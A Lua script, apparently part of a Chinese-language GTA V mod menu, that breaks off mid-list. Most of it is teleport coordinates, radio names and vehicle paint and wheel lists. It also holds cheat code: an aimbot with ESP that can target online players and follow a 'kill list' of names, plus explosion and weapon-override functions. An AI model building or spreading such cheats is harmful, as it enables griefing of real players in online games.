local launcherThrowable = util.joaat('weapon_grenade')
local throwables_launcher
function throwablebullet(toggle)
    throwables_launcher = toggle
    util.create_tick_handler(function()
        if WEAPON.GET_SELECTED_PED_WEAPON(players.user_ped()) == -1568386805 then --if holding grenade launcher
            if PED.IS_PED_SHOOTING(players.user_ped()) then
                if not remove_projectiles then
                    remove_projectiles = true
                    disableProjectileLoop(-1568386805)
                end
                util.create_thread(function()
                    local currentWeapon = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(players.user_ped(), false)
                    local pos1 = ENTITY._GET_ENTITY_BONE_POSITION_2(currentWeapon, ENTITY.GET_ENTITY_BONE_INDEX_BY_NAME(currentWeapon, 'gun_muzzle'))
                    local pos2 = get_offset_from_gameplay_camera(30)
                    if not WEAPON.HAS_PED_GOT_WEAPON(players.user_ped(), launcherThrowable, false) then
                        WEAPON.GIVE_WEAPON_TO_PED(players.user_ped(), launcherThrowable, 9999, false, false)
                    end
                    wait()
                    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos1.x, pos1.y, pos1.z, pos2.x, pos2.y, pos2.z, 200, true, launcherThrowable, players.user_ped(), true, false, 2000.0)
                end)
            else
                remove_projectiles = false
            end
        else
            remove_projectiles = false
        end
        return throwables_launcher
    end)
end

local explosion_circle_angle = 0
function explosion_circle(ped, angle, radius)
    local ped_coords = ENTITY.GET_ENTITY_COORDS(ped)

    local offset_x = ped_coords.x
    local offset_y = ped_coords.y

    local x = offset_x + radius * math.cos(angle)
    local y = offset_y + radius * math.sin(angle)

    FIRE.ADD_EXPLOSION(x, y, ped_coords.z, 4, 1, true, false, 0)
end

function pwdl(toggle)
    local graceRef = refbypass("Self>Gracefulness")
    local valueragdoll = getvalue(graceRef)
    togglestate = toggle
    while(togglestate) do
        while(PED.IS_PED_FALLING(players.user_ped())) do
            local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
            local floorcoords, success
            repeat
                success, floorcoords = util.get_ground_z(c.x, c.y)
                wait()
            until success
            if(c.z >= floorcoords + 5) then
                if not (c.z >= floorcoords + 7) then
                    if(valueragdoll) then --baguette
                        TASK.CLEAR_PED_TASKS_IMMEDIATELY(players.user_ped())
                    else
                        menu.trigger_commands("grace on")
                    end
                end
            end
            wait()
        end
        wait()
    end
end
--恶灵骑士
looped_ptfxs = {}
burning_man_ptfx_asset = "core"
burning_man_ptfx_effect = "fire_wrecked_plane_cockpit"
function elqes()
vehicleelqs = CreateVehicle (1491277511,ENTITY.GET_ENTITY_COORDS(players.user_ped(),false),0,true)
ENTITY.SET_ENTITY_RENDER_SCORCHED(vehicleelqs,true)
VEHICLE.SET_VEHICLE_COLOURS(vehicleelqs,147,147)
VEHICLE.SET_VEHICLE_EXTRA_COLOURS(vehicleelqs,30,15)
PED.SET_PED_INTO_VEHICLE(players.user_ped(),vehicleelqs,-1)
wait(500)
request_ptfx_asset_firemen(burning_man_ptfx_asset)
        for _, boneName in pairs({"wheel_lf", "wheel_lr"}) do
GRAPHICS.USE_PARTICLE_FX_ASSET(burning_man_ptfx_asset)
            local bone_id = ENTITY.GET_ENTITY_BONE_INDEX_BY_NAME(vehicleelqs, boneName)
            fx = GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE(burning_man_ptfx_effect, vehicleelqs, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, bone_id, 0.9, false, false, false, 0, 0, 0, 0)
            looped_ptfxs[#looped_ptfxs+1] = fx
            GRAPHICS.SET_PARTICLE_FX_LOOPED_COLOUR(fx, 100, 100, 100, false)
      end
end
--zimiao
 ESPrgb = {color= {r= 0, g = 1, b = 0, a = 1}}
 ESPcolor = {
    r = math.floor(ESPrgb.color.r * 255),
    g = math.floor(ESPrgb.color.g * 255),
    b = math.floor(ESPrgb.color.b * 255),
    a = math.floor(ESPrgb.color.a * 255)
}
 target = true
 aimbot = {esp = true, box = true, bone = 31086, curweap = true, weapon = 'WEAPON_TACTICALRIFLE', damage = 200, targetveh = true,
fov = 3, tarplayers = true, tarnpcs = true, tarfriends = false, owner = players.user_ped(), stw = false, kill_list = false, alert = true}
function Ped_aim_pool(fov)
    local ped_handles = entities.get_all_peds_as_handles()
    for ped_handles as ped do
        if players.user_ped() != ped and not PED.IS_PED_DEAD_OR_DYING(ped, 1) and ENTITY.DOES_ENTITY_EXIST(ped) then
            local ped_coor = ENTITY.GET_ENTITY_COORDS(ped, true)
            local player_coor = ENTITY.GET_ENTITY_COORDS(players.user_ped(), true)
            local disbet = SYSTEM.VDIST2(ped_coor.x, ped_coor.y, ped_coor.z, player_coor.x, player_coor.y, player_coor.z)
            local too_far = 60000
                
            if not PED.IS_PED_FACING_PED(players.user_ped(), ped, fov) then
                target = false
            else
                target = true
            end

            if disbet >= too_far then
                target = false
            end

            if PED.IS_PED_A_PLAYER(ped) and not aimbot.tarplayers or aimbot.kill_list then
                target = false
            end

            if not PED.IS_PED_A_PLAYER(ped) and not aimbot.tarnpcs or aimbot.kill_list then
                target = false
            end

            if PED.IS_PED_IN_ANY_VEHICLE(ped, true) and not aimbot.targetveh then
                target = false
            end

            if not ENTITY.HAS_ENTITY_CLEAR_LOS_TO_ENTITY(players.user_ped(), ped, 17) and not aimbot.stw then
                target = false
            end
            local handle_ptr = memory.alloc(13*8)
            local function pid_to_handle(pid)--credits to lance
                NETWORK.NETWORK_HANDLE_FROM_PLAYER(pid, handle_ptr, 13)
                return handle_ptr
            end
            if PED.IS_PED_A_PLAYER(ped) and aimbot.tarplayers and not aimbot.tarfriends then
                local pid = NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(ped)
                local hdl = pid_to_handle(pid)
                if NETWORK.NETWORK_IS_FRIEND(hdl) then
                    target = false
                end
            end
            if PED.IS_PED_A_PLAYER(ped) and aimbot.kill_list then
                local pid = NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(ped)
                local pname = PLAYER.GET_PLAYER_NAME(pid)
                for load_settings(Kill_List) as Names do
                    for Names as name do
                        if name == pname then
                            target = true
                        end
                    end
                end       
            end
            if target and PLAYER.IS_PLAYER_FREE_AIMING(players.user()) then
                aim_target = ped
                AimbotTarget(aimbot, aim_target, ESPrgb)
                if aim_target > 1 then
                    break
                end
            else 
                aim_target = 0
            end
        end
    end
    return aim_target
end
 SuperESPrgb = {color= {r= 0, g = 1, b = 0, a = 1}}
 SuperESPcolor = {
    r = math.floor(ESPrgb.color.r * 255),
    g = math.floor(ESPrgb.color.g * 255),
    b = math.floor(ESPrgb.color.b * 255),
    a = math.floor(ESPrgb.color.a * 255)
}

function Xraytarget(xray, aim_target, rgb)
    if xray.espline then
        Draw_esp(aim_target, rgb)
    end
    if xray.espbox then
        local color = {
            r = rgb.color.r * 255,
            g = rgb.color.g * 255,
            b = rgb.color.b * 255,
            a = rgb.color.a * 255
        }
        draw_bounding_box(aim_target, color)
    end
    if xray.espbones then
        Bone_Esp(aim_target, SuperESPrgb)  
    end
end
function AimbotTarget(aimbot, aim_target, rgb)
    if PED.IS_PED_A_PLAYER(aim_target) then
        local pid = NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(aim_target)
        local pname = PLAYER.GET_PLAYER_NAME(pid)
        if aimbot.alert then
            ACutil(Str_trans('Target is ')..pname)
        end
    end
    if aimbot.esp then
        Draw_esp(aim_target, ESPrgb)
    end
    if aimbot.box then
        local color = {
            r = rgb.color.r * 255,
            g = rgb.color.g * 255,
            b = rgb.color.b * 255,
            a = rgb.color.a * 255
        }
        draw_bounding_box(aim_target, color)
    end
    if aimbot.curweap and PED.IS_PED_SHOOTING(players.user_ped()) then
       aimbot.weapon = util.reverse_joaat(WEAPON.GET_SELECTED_PED_WEAPON(players.user_ped()))
       ShootPed(aim_target, util.joaat(aimbot.weapon))
    elseif not aimbot.curweap and PED.IS_PED_SHOOTING(players.user_ped()) then
        ShootPed(aim_target, util.joaat(aimbot.weapon))
    end
end
function ShootPed(ped, weap)
    local bone_coor = PED.GET_PED_BONE_COORDS(ped, aimbot.bone, 0, 0, 0)
    local bone_coor2 = PED.GET_PED_BONE_COORDS(ped, aimbot.bone, -0.1, 0, 0)
    local bone_coor3 = PED.GET_PED_BONE_COORDS(ped, aimbot.bone, 0.1, 0, 0)
    for i = 1, 3 do
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(bone_coor2.x, bone_coor2.y, bone_coor2.z, bone_coor3.x, bone_coor3.y, bone_coor3.z, aimbot.damage, 0, weap, aimbot.owner, false, false, 1000)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(bone_coor.x, bone_coor.y, bone_coor.z + 1 , bone_coor.x, bone_coor.y, bone_coor.z - 1, aimbot.damage, 0, weap, aimbot.owner , false, false, 1000)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(bone_coor.x, bone_coor.y, bone_coor.z - 1 , bone_coor.x, bone_coor.y, bone_coor.z + 1, aimbot.damage, 0, weap, aimbot.owner , false, false, 1000)
    end
end
 function RequestControl(Entity, timeout)
    local time = util.current_time_millis() + (timeout or 1000)
    while time > util.current_time_millis() and not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(Entity) do
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(Entity)
        wait()
    end
    return NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(Entity)
end
 function ClearEntities(list)
    for _, entity in pairs(list) do
        if ENTITY.DOES_ENTITY_EXIST(entity) then
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(entity, false, false)
            RequestControl(entity)
            entities.delete_by_handle(entity)
        end
    end
end
function for_table_do(table,with_access,func)
	for i,ent in ipairs(table) do
		if with_access then
			if not RequestControlOfEnt(ent) then goto skip end
		end
		func(ent)
		::skip::
	end
end
function get_player_veh(pid,with_access)
	local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)	
	if PED.IS_PED_IN_ANY_VEHICLE(ped,true) then
		local vehicle = PED.GET_VEHICLE_PED_IS_IN(ped, false)
		if not with_access then
			return vehicle
		end
		if RequestControlOfEnt(vehicle) then
			return vehicle
		end
	end
	return 0
end

function teleport_place()
local interiors = {
{"安全空间 [挂机室]", {x=-158.71494, y=-982.75885, z=149.13135}},
{"酷刑室", {x=147.170, y=-2201.804, z=4.688}},
{"矿道", {x=-595.48505, y=2086.4502, z=131.38136}},
{"欧米茄车库", {x=2330.2573, y=2572.3005, z=46.679367}},
{"末日任务服务器组", {x=2155.077, y=2920.9417, z=-81.075455}},
{"角色捏脸房间", {x=402.91586, y=-998.5701, z=-99.004074}},
{"Lifeinvader大楼", {x=-1082.8595, y=-254.774, z=37.763317}},
{"竞速结束车库", {x=405.9228, y=-954.1149, z=-99.6627}},
{"被摧毁的医院", {x=304.03894, y=-590.3037, z=43.291893}},
{"体育场", {x=-256.92334, y=-2024.9717, z=30.145584}},
{"Split Sides喜剧俱乐部", {x=-430.00974, y=261.3437, z=83.00648}},
{"巴哈马酒吧", {x=-1394.8816, y=-599.7526, z=30.319544}},
{"看门人之家", {x=-110.20285, y=-8.6156025, z=70.51957}},
{"费蓝德医生之家", {x=-1913.8342, y=-574.5799, z=11.435149}},
{"杜根房子", {x=1395.2512, y=1141.6833, z=114.63437}},
{"弗洛伊德公寓", {x=-1156.5099, y=-1519.0894, z=10.632717}},
{"麦克家", {x=-813.8814, y=179.07889, z=72.15914}},
{"富兰克林家（旧）", {x=-14.239959, y=-1439.6913, z=31.101551}},
{"富兰克林家（新）", {x=7.3125067, y=537.3615, z=176.02803}},
{"崔佛家", {x=1974.1617, y=3819.032, z=33.436287}},
{"莱斯斯家", {x=1273.898, y=-1719.304, z=54.771}},
{"莱斯特的纺织厂", {x=713.5684, y=-963.64795, z=30.39534}},
{"莱斯特的纺织厂办事处", {x=707.2138, y=-965.5549, z=30.412853}},
{"甲基安非他明实验室", {x=1391.773, y=3608.716, z=38.942}},
{"人道实验室", {x=3625.743, y=3743.653, z=28.69009}},
{"汽车旅馆客房", {x=152.2605, y=-1004.471, z=-99.024}},
{"警察局", {x=443.4068, y=-983.256, z=30.689589}},
{"太平洋标准银行金库", {x=263.39627, y=214.39891, z=101.68336}},
{"布莱恩郡银行", {x=-109.77874, y=6464.8945, z=31.626724}},
{"龙舌兰酒吧", {x=-564.4645, y=275.5777, z=83.074585}},
{"废料厂车库", {x=485.46396, y=-1315.0614, z=29.2141}},
{"失落摩托帮", {x=980.8098, y=-101.96038, z=74.84504}},
{"范吉利科珠宝店", {x=-629.9367, y=-236.41296, z=38.057056}},
{"机场休息室", {x=-913.8656, y=-2527.106, z=36.331566}},
{"停尸房", {x=240.94368, y=-1379.0645, z=33.74177}},
{"联盟保存处", {x=1.298771, y=-700.96967, z=16.131021}},
{"军事基地瞭望塔", {x=-2357.9187, y=3249.689, z=101.45073}},
{"事务所内部", {x=-1118.0181, y=-77.93254, z=-98.99977}},
{"复仇者内部", {x=518.6444, y=4750.4644, z=-69.3235}},
{"恐霸内部", {x=-1421.015, y=-3012.587, z=-80.000}},
{"地堡内部", {x=899.5518,y=-3246.038, z=-98.04907}},
{"IAA 办公室", {x=128.20, y=-617.39, z=206.04}},
{"FIB 顶层", {x=135.94359, y=-749.4102, z=258.152}},
{"FIB 47层", {x=134.5835, y=-766.486, z=234.152}},
{"FIB 49层", {x=134.635, y=-765.831, z=242.152}},
{"大公鸡", {x=-31.007448, y=6317.047, z=40.04039}},
{"大麻商店", {x=-1170.3048, y=-1570.8246, z=4.663622}},
{"脱衣舞俱乐部DJ位置", {x=121.398254, y=-1281.0024, z=29.480522}},
}
        for index, data in pairs(interiors) do
            local location_name = data[1]
            local location_coords = data[2]
            menu.action(teleport, location_name, {}, "", function()
                menu.trigger_commands("doors on")
                menu.trigger_commands("nodeathbarriers on")
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(players.user_ped(), location_coords.x, location_coords.y, location_coords.z, false, false, false)
            end)
        end
    end

station_name = {
    ["布莱恩郡之声"] = "RADIO_11_TALK_02", 
    ["蓝色方舟"] = "RADIO_12_REGGAE",
    ["全球电台"] = "RADIO_13_JAZZ",
    ["飞莲电台"] = "RADIO_14_DANCE_02",
    ["真相 91.1"] = "RADIO_15_MOTOWN",
    ["实验室电台"] = "RADIO_20_THELAB",
    ["明镜公园之音"] = "RADIO_16_SILVERLAKE",
    ["103.2 空间"] = "RADIO_17_FUNK",
    ["好麦坞大道电台"] = "RADIO_18_90S_ROCK",
    ["金发洛圣都 97.8 电台"] = "RADIO_21_DLC_XM17",
    ["洛圣都地下电台"] = "RADIO_22_DLC_BATTLE_MIX1_RADIO",
    ["iFruit 电台"] = "RADIO_23_DLC_XM19_RADIO",
    ["自电台(如果该玩家没有设置自电台,将自动切换为 MOTOMAMI 洛圣都电台)"] = "RADIO_19_USER",
    ["洛圣都摇滚台"] = "RADIO_01_CLASS_ROCK",
    ["无止境流行乐电台"] = "RADIO_02_POP",
    ["洛圣都广播电台"] = "RADIO_03_HIPHOP_NEW",
    ["X 频道"] = "RADIO_04_PUNK",
    ["西海岸谈话电台"] = "RADIO_05_TALK_01",
    ["叛逆电台"] = "RADIO_06_COUNTRY", 
    ["灵魂之蜡电台"] = "RADIO_07_DANCE_01",
    ["东洛电台"] = "RADIO_08_MEXICAN",
    ["西海岸经典"] = "RADIO_09_HIPHOP_OLD",
    ["媒体播放器"] = "RADIO_36_AUDIOPLAYER",
    ["音乐柜"] = "RADIO_35_DLC_HEI4_MLR",
    ["库尔特 FM"] = "RADIO_34_DLC_HEI4_KULT",
    ["放松依旧洛圣都"] = "RADIO_27_DLC_PRHEI4",
}

disguise_object = 0
disguise_objects = {
    [0] = "prop_bush_med_03",
    [1] = "prop_tree_lficus_06",
    [2] = "prop_palm_fan_03_b",
    [3] = "prop_streetlight_01",
    [4] = "prop_recyclebin_04_b",
    [5] = "prop_recyclebin_05_a",
    [6] = "prop_riding_crop_01",
    [7] = "prop_cs_katana_01",
    [8] = "prop_kino_light_02",
    [9] = "apa_prop_flag_china",
    [10] = "prop_gr_bmd_b",
    [11] = "w_smug_bomb_01",
    [12] = "xs_prop_arena_pit_fire_01a",
}
disguise_names = {
    [0] = "灌木丛",
    [1] = "树",
    [2] = "棕榈树",
    [3] = "路灯",
    [4] = "垃圾桶",
    [5] = "回收站",
    [6] = "马鞭",
    [7] = "武士刀",
    [8] = "灯架",
    [9] = "国旗",
    [10] = "锅盖",
    [11] = "原子弹",
    [12] = "大烧烤",
}

    Til = {
        T('NONE'),
        T('BLACK'),
        T('DARKSMOKE'),
        T('LIGHTSMOKE'),
        T('STOCK'),
        T('LIMO'),
        T('GREEN')
    }

 Mainc = {
        T('Metallic Black'),
        T('Metallic Graphite Black'),
        T('Metallic Black Steal'),
        T('Metallic Dark Silver'),  
        T('Metallic Silver'),
        T('Metallic Blue Silver'),
        T('Metallic Steel Gray'),
        T('Metallic Shadow Silver'),
        T('Metallic Stone Silver'),
        T('Metallic Midnight Silver'),
        T('Metallic Gun Metal'),
        T('Metallic Anthracite Grey'),
        T('Matte Black'),
        T('Matte Gray'),
        T('Matte Light Grey'),  
        T('Util Black'),
        T('Util Black Poly'),
        T('Util Dark silver'),  
        T('Util Silver'),
        T('Util Gun Metal'),  
        T('Util Shadow Silver'),
        T('Worn Black'),
        T('Worn Graphite'),
        T('Worn Silver Grey'),  
        T('Worn Silver'),
        T('Worn Blue Silver'),  
        T('Worn Shadow Silver'),  
        T('Metallic Red'),
        T('Metallic Torino Red'),
        T('Metallic Formula Red'),
        T('Metallic Blaze Red'),  
        T('Metallic Graceful Red'), 
        T('Metallic Garnet Red'),
        T('Metallic Desert Red'),
        T('Metallic Cabernet Red'),
        T('Metallic Candy Red'),
        T('Metallic Sunrise Orange'), 
        T('Metallic Classic Gold'),
        T('Metallic Orange'), 
        T('Matte Red'),   
        T('Matte Dark Red'),  
        T('Matte Orange'),
        T('Matte Yellow'),  
        T('Util Red'),
        T('Util Bright Red'), 
        T('Util Garnet Red'), 
        T('Worn Red'),
        T('Worn Golden Red'),
        T('Worn Dark Red'),
        T('Metallic Dark Green'), 
        T('Metallic Racing Green'),
        T('Metallic Sea Green'),  
        T('Metallic Olive Green'),  
        T('Metallic Green'),
        T('Metallic Gasoline Blue Green'),
        T('Matte Lime Green'),
        T('Util Dark Green'),   
        T('Util Green'),
        T('Worn Dark Green'), 
        T('Worn Green'),
        T('Worn Sea Wash'),
        T('Metallic Midnight Blue'),  
        T('Metallic Dark Blue'),  
        T('Metallic Saxony Blue'),  
        T('Metallic Blue'),
        T('Metallic Mariner Blue'),   
        T('Metallic Harbor Blue'),  
        T('Metallic Diamond Blue'), 
        T('Metallic Surf Blue'),
        T('Metallic Nautical Blue'),  
        T('Metallic Bright Blue'),
        T('Metallic Purple Blue'),  
        T('Metallic Spinnaker Blue'),   
        T('Metallic Ultra Blue'), 
        T('Metallic Bright Blue'),  
        T('Util Dark Blue'),
        T('Util Midnight Blue'),  
        T('Util Blue'),
        T('Util Sea Foam Blue'),
        T('Util Lightning blue'),
        T('Util Maui Blue Poly'),
        T('Util Bright Blue'),
        T('Matte Dark Blue'),
        T('Matte Blue'),
        T('Matte Midnight Blue'), 
        T('Worn Dark blue'),
        T('Worn Blue'),
        T('Worn Light blue'),
        T('Metallic Taxi Yellow'),
        T('Metallic Race Yellow'),
        T('Metallic Bronze'),
        T('Metallic Yellow Bird'),
        T('Metallic Lime'),
        T('Metallic Champagne'),
        T('Metallic Pueblo Beige'), 
        T('Metallic Dark Ivory'),
        T('Metallic Choco Brown'),
        T('Metallic Golden Brown'),
        T('Metallic Light Brown'),
        T('Metallic Straw Beige'),  
        T('Metallic Moss Brown'),
        T('Metallic Biston Brown'),
        T('Metallic Beechwood'),
        T('Metallic Dark Beechwood'),   
        T('Metallic Choco Orange'), 
        T('Metallic Beach Sand'),
        T('Metallic Sun Bleeched Sand'),  
        T('Metallic Cream'),
        T('Util Brown'),  
        T('Util Medium Brown'), 
        T('Util Light Brown'),  
        T('Metallic White'),  
        T('Metallic Frost White'),
        T('Worn Honey Beige'),
        T('Worn Brown'),  
        T('Worn Dark Brown'),
        T('Worn straw beige'),  
        T('Brushed Steel'),
        T('Brushed Black steel'),   
        T('Brushed Aluminium'),
        T('Chrome'),
        T('Worn Off White'), 
        T('Util Off White'), 
        T('Worn Orange'), 
        T('Worn Light Orange'), 
        T('Metallic Securicor Green'),    
        T('Worn Taxi Yellow'), 
        T('police car blue'),   
        T('Matte Green'),   
        T('Matte Brown'),   
        T('Worn Orange'), 
        T('Matte White'),   
        T('Worn White'),
        T('Worn Olive Army Green'),   
        T('Pure White'),  
        T('Hot Pink'),  
        T('Salmon pink'),
        T('Metallic Vermillion Pink'),
        T('Orange'),
        T('Green'), 
        T('Blue'),
        T('Mettalic Black Blue'),   
        T('Metallic Black Purple'), 
        T('Metallic Black Red'),
        T('Hunter Green'),
        T('Metallic Purple'),
        T('Metaillic V Dark Blue'), 
        T('MODSHOP BLACK1'), 
        T('Matte Purple'),
        T('Matte Dark Purple'),   
        T('Metallic Lava Red'), 
        T('Matte Forest Green'),  
        T('Matte Olive Drab'),  
        T('Matte Desert Brown'),
        T('Matte Desert Tan'),  
        T('Matte Foilage Green'),
        T('DEFAULT ALLOY COLOR'),
        T('Epsilon Blue'),
        T('Pure Gold'),
        T('Brushed Gold')
    }

Bbw = {
    T('Chrome OG Hunnets'),
    T('Gold OG Hunnets'),
    T('Chrome Wires'),
    T('Gold Wires'),
    T('Chrome Spoked Out'),
    T('Gold Spoked Out'),
    T('Chrome Knock-Offs'),
    T('Gold Knock-Offs'),
    T('Chrome Bigger Worm'),
    T('Gold Bigger Worm'),
    T('Chrome Vintage Wire'),
    T('Gold Vintage Wire'),
    T('Chrome Classic Wire'),
    T('Gold Classic Wire'),
    T('GroundRide'),
    T('Chrome Smoothie'),
    T('Gold Smoothie'),
    T('Chrome Classic Rod'),
    T('Gold Classic Rod'),
    T('Chrome Dollar'),
    T('Gold Dollar'),
    T('Chrome Mighty Star'),
    T('Gold Mighty Star'),
    T('Chrome Decadent Dish'),
    T('Gold Decadent Dish'),
    T('Gold Razor Style'),
    T('Chrome Celtic Knot'),
    T('Gold Celtic Knot'),
    T('Chrome Warrior Dish'),
    T('Gold Warrior Dish'),
    T('Gold Big Dog Spokes'),
    T('Chrome OG Hunnets Thin White'),
    T('Gold OG Hunnets Thin White'),
    T('Chrome Wires Thin White'),
    T('Gold Wires Thin White'),
    T('Chrome Spoked Out Thin White'),
    T('Gold Spoked Out Thin White'),
    T('Chrome Knock-Offs Thin White'),
    T('Gold Knock-Offs Thin White'),
    T('Chrome Bigger Worm Thin White'),
    T('Gold Bigger Worm Thin White'),
    T('Chrome Vintage Wire Thin White'),
    T('Gold Vintage Wire Thin White'),
    T('Chrome Classic Wire Thin White'),
    T('Gold Classic Wire Thin White'),
    T('GroundRide Thin White'),
    T('Chrome Smoothie Thin White'),
    T('Gold Smoothie Thin White'),
    T('Chrome Classic Rod Thin White'),
    T('Gold Classic Rod Thin White'),
    T('Chrome Dollar Thin White'),
    T('Gold Dollar Thin White'),
    T('Chrome Mighty Star Thin White'),
    T('Gold Mighty Star Thin White'),
    T('Chrome Decadent Dish Thin White'),
    T('Gold Decadent Dish Thin White'),
    T('Gold Razor Style Thin White'),
    T('Chrome Celtic Knot Thin White'),
    T('Gold Celtic Knot Thin White'),
    T('Chrome Warrior Dish Thin White'),
    T('Gold Warrior Dish Thin White'),
    T('Gold Big Dog Spokes Thin White'),
    T('Chrome OG Hunnets Medium White'),
    T('Gold OG Hunnets Medium White'),
    T('Chrome Wires Medium White'),
    T('Gold Wires Medium White'),
    T('Chrome Spoked Out Medium White'),
    T('Gold Spoked Out Medium White'),
    T('Chrome Knock-Offs Medium White'),
    T('Gold Knock-Offs Medium White'),
    T('Chrome Bigger Worm Medium White'),
    T('Gold Bigger Worm Medium White'),
    T('Chrome Vintage Wire Medium White'),
    T('Gold Vintage Wire Medium White'),
    T('Chrome Classic Wire Medium White'),
    T('Gold Classic Wire Medium White'),
    T('GroundRide Medium White'),
    T('Chrome Smoothie Medium White'),
    T('Gold Smoothie Medium White'),
    T('Chrome Classic Rod Medium White'),
    T('Gold Classic Rod Medium White'),
    T('Chrome Dollar Medium White'),
    T('Gold Dollar Medium White'),
    T('Chrome Mighty Star Medium White'),
    T('Gold Mighty Star Medium White'),
    T('Chrome Decadent Dish Medium White'),
    T('Gold Decadent Dish Medium White'),
    T('Gold Razor Style Medium White'),
    T('Chrome Celtic Knot Medium White'),
    T('Gold Celtic Knot Medium White'),
    T('Chrome Warrior Dish Medium White'),
    T('Gold Warrior Dish Medium White'),
    T('Gold Big Dog Spokes Medium White'),
    T('Chrome OG Hunnets Thick White'),
    T('Gold OG Hunnets Thick White'),
    T('Chrome Wires Thick White'),
    T('Gold Wires Thick White'),
    T('Chrome Spoked Out Thick White'),
    T('Gold Spoked Out Thick White'),
    T('Chrome Knock-Offs Thick White'),
    T('Gold Knock-Offs Thick White'),
    T('Chrome Bigger Worm Thick White'),
    T('Gold Bigger Worm Thick White'),
    T('Chrome Vintage Wire Thick White'),
    T('Gold Vintage Wire Thick White'),
    T('Chrome Classic Wire Thick White'),
    T('Gold Classic Wire Thick White'),
    T('GroundRide Thick White'),
    T('Chrome Smoothie Thick White'),
    T('Gold Smoothie Thick White'),
    T('Chrome Classic Rod Thick White'),
    T('Gold Classic Rod Thick White'),
    T('Chrome Dollar Thick White'),
    T('Gold Dollar Thick White'),
    T('Chrome Mighty Star Thick White'),
    T('Gold Mighty Star Thick White'),
    T('Chrome Decadent Dish Thick White'),
    T('Gold Decadent Dish Thick White'),
    T('Gold Razor Style Thick White'),
    T('Chrome Celtic Knot Thick White'),
    T('Gold Celtic Knot Thick White'),
    T('Chrome Warrior Dish Thick White'),
    T('Gold Warrior Dish Thick White'),
    T('Gold Big Dog Spokes Thick White'),
    T('Chrome OG Hunnets Red Line'),
    T('Gold OG Hunnets Red Line'),
    T('Chrome Wires Red Line'),
    T('Gold Wires Red Line'),
    T('Chrome Spoked Out Red Line'),
    T('Gold Spoked Out Red Line'),
    T('Chrome Knock-Offs Red Line'),
    T('Gold Knock-Offs Red Line'),
    T('Chrome Bigger Worm Red Line'),
    T('Gold Bigger Worm Red Line'),
    T('Chrome Vintage Wire Red Line'),
    T('Gold Vintage Wire Red Line'),
    T('Chrome Classic Wire Red Line'),
    T('Gold Classic Wire Red Line'),
    T('GroundRide Red Line'),
    T('Chrome Smoothie Red Line'),
    T('Gold Smoothie Red Line'),
    T('Chrome Classic Rod Red Line'),
    T('Gold Classic Rod Red Line'),
    T('Chrome Dollar Red Line'),
    T('Gold Dollar Red Line'),
    T('Chrome Mighty Star Red Line'),
    T('Gold Mighty Star Red Line'),
    T('Chrome Decadent Dish Red Line'),
    T('Gold Decadent Dish Red Line'),
    T('Gold Razor Style Red Line'),
    T('Chrome Celtic Knot Red Line'),
    T('Gold Celtic Knot Red Line'),
    T('Chrome Warrior Dish Red Line'),
    T('Gold Warrior Dish Red Line'),
    T('Gold Big Dog Spokes Red Line'),
    T('Chrome OG Hunnets Blue Line'),
    T('Gold OG Hunnets Blue Line'),
    T('Chrome Wires Blue Line'),
    T('Gold Wires Blue Line'),
    T('Chrome Spoked Out Blue Line'),
    T('Gold Spoked Out Blue Line'),
    T('Chrome Knock-Offs Blue Line'),
    T('Gold Knock-Offs Blue Line'),
    T('Chrome Bigger Worm Blue Line'),
    T('Gold Bigger Worm Blue Line'),
    T('Chrome Vintage Wire Blue Line'),
    T('Gold Vintage Wire Blue Line'),
    T('Chrome Classic Wire Blue Line'),
    T('Gold Classic Wire Blue Line'),
    T('GroundRide Blue Line'),
    T('Chrome Smoothie Blue Line'),
    T('Gold Smoothie Blue Line'),
    T('Chrome Classic Rod Blue Line'),
    T('Gold Classic Rod Blue Line'),
    T('Chrome Dollar Blue Line'),
    T('Gold Dollar Blue Line'),
    T('Chrome Mighty Star Blue Line'),
    T('Gold Mighty Star Blue Line'),
    T('Chrome Decadent Dish Blue Line'),
    T('Gold Decadent Dish Blue Line'),
    T('Gold Razor Style Blue Line'),
    T('Chrome Celtic Knot Blue Line'),
    T('Gold Celtic Knot Blue Line'),
    T('Chrome Warrior Dish Blue Line'),
    T('Gold Warrior Dish Blue Line'),
    T('Gold Big Dog Spokes Blue Line'),
}
 Bow = {
    T('OG Hunnets'),
    T('OG Hunnets (Chrome Lip)'),
    T('Knock-Offs'),
    T('Knock-Offs (Chrome Lip)'),
    T('Spoked Out'),
    T('Spoked Out (Chrome Lip)'),
    T('Vintage Wire'),
    T('Vintage Wire (Chrome Lip)'),
    T('Smoothie'),
    T('Smoothie (Chrome Lip)'),
    T('Smoothie (Solid Color)'),
    T('Rod Me Up'),
    T('Rod Me Up (Chrome Lip)'),
    T('Rod Me Up (Solid Color)'),
    T('Clean'),
    T('Lotta Chrome'),
    T('Spindles'),
    T('Viking'),
    T('Triple Spoke'),
    T('Pharohe'),
    T('Tiger Style'),
    T('Three Wheelin'),
    T('Big Bar'),
    T('Biohazard'),
    T('Waves'),
    T('Lick Lick'),
    T('Spiralizer'),
    T('Hypnotics'),
    T('Psycho-Delic'),
    T('Half Cut'),
    T('Super Electric'),
    T('OG Hunnets Thin White'),
    T('OG Hunnets (Chrome Lip) Thin White'),
    T('Knock-Offs Thin White'),
    T('Knock-Offs (Chrome Lip) Thin White'),
    T('Spoked Out Thin White'),
    T('Spoked Out (Chrome Lip) Thin White'),
    T('Vintage Wire Thin White'),
    T('Vintage Wire (Chrome Lip) Thin White'),
    T('Smoothie Thin White'),
    T('Smoothie (Chrome Lip) Thin White'),
    T('Smoothie (Solid Color) Thin White'),
    T('Rod Me Up Thin White'),
